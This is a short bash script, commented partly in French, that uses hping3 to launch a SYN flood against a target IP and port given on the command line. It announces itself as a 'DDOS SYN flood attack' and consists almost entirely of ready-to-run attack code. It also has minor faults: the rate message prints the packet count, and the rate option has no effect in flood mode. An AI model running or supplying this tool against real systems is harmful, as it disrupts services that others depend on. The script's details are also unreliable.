#!/usr/bin/env bash
set -Eeuo pipefail 

require(){ command -v "$1" >/dev/null 2>&1 || { printf 'Missing dependency: %s\n' "$1" >&2; exit 127; }; }
require hping3

TARGET="${1:-}"
PORT="${2:-80}"
PACKETS="${3:-1000}"
RATE="${4:-100}"

if [[ -z "$TARGET" ]]; then
  echo "Usage: $0 <TARGET_IP> [PORT] [PACKETS] [RATE]" >&2
  echo "Example: $0 192.168.1.100 80 1000 100" >&2
  exit 1
fi

echo "[*] DDOS SYN flood attack against $TARGET:$PORT"
echo "[*] Packets: $PACKETS | Rate: $PACKETS/s"
echo "[*] Starting in 3 seconds..."
sleep 3

# hping3: outil de génération de paquets TCP/IP
# -S: envoi de paquets SYN (DDOS SYN flood)
# -p $PORT: port cible
# --flood: mode flood (rapide)
# -i u100: intervalle de 100 microsecondes entre paquets
# -c $PACKETS: nombre total de paquets
hping3 -S -p "$PORT" --flood -i u"$RATE" -c "$PACKETS" "$TARGET"

echo "[✓] DDOS attack completed."
